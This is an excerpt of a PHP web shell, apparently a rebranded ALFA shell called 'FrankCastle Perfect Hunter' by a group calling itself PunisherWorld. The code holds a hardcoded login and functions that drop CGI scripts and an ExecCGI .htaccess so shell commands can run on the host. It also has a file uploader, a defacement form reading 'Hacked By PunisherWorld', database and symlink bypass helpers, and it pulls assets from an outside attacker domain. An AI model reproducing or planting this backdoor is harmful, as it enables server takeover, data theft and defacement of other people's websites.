...
$GLOBALS['FrankCastle'] = array(
    'username' => 'Punisher',
    'password' => 'aa00ba30957ed523e23ce640c37cb6d8',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['DB_NAME'] = $GLOBALS['FrankCastle'];
...
define("__ALFA_DATA_FOLDER__", "FrankCastle");
...
<title>.: Punisher Tesla :.</title><center>
<center><img style="border-radius:100px;"width="500" height="250" alt="FrankCastle Perfect Hunter" draggable="false" src="https://Punisher.lol/love/FrankCastle-Perfect-Hunter-transformed.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>FrankCastle Perfect Hunter</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["Punishercgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["Punishercgiapi"])){
			if(!@file_exists("Punishercgiapi/".$_COOKIE["Punishercgiapi"].".Punisher")){
				$recreate = true;
				$lang = $_COOKIE["Punishercgiapi"];
			}
		}
		if(!isset($_COOKIE["Punishercgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".Punisher",$source);
			}
			alfacgihtaccess('cgi', "Punishercgiapi/");
		}else{
			$lang = $_COOKIE["Punishercgiapi"];
		}
		$cgi_ext = ".Punisher";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/Punishercgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("Punishercgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("Punishercgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
echo '<html>';
echo "<title>FrankCastle Perfect Hunter Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ FrankCastle Perfect Hunter ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="lph team 2023" draggable="false" src="https://Punisher.lol/love/asta.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='http://Punisher.lol/love/heads.png';
	$s['alfamini']='https://Punisher.lol/love/heads.png';
	$s['loader']='http://Punisher.lol/love/loader.svg';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='http://Punisher.lol/love/FrankCastle-Perfect-Hunter-transformed.png'><br>
<font color='#FFFFFF'>Shell ReCoded By PunisherWorld (LPH TEAM)</font><br>
<font color='#00A220'>Contact : Punisher@FrankCastleperfecthunter.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["Punishercgiapi_mode"])&&!isset($_COOKIE["Punishercgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('Punishercgiapi',0755);
	__write_file("Punishercgiapi/".$name, __get_resource($source));
	@chmod("Punishercgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/Punishercgiapi';sh getheader.Punisher",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ PunisherGroup &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY PunisherWORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>Punisher@FrankCastleperfecthunter.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href=''>@Punisher</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/Punishercgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/Punishercgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By PunisherWorld</title><b>Hacked By PunisherWorld</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By FrankCastle Perfect Hunter";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
<title>Hacked By PunisherWorld</title><b>Hacked By PunisherWorld</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgiPunisher/'.$cginame);
	}else{
		echo $resource;
	}
}
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://Punisher.lol/love/FrankCastle-Perfect-Hunter-transformed.png\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgiPunisher/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#ReCoded By PunisherWorld\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .Punisher\nAddHandler cgi-script .Punisher";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.Punisher",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/Punishercgiapi;sh basedir.Punisher ".$makepwd,false,true,true);
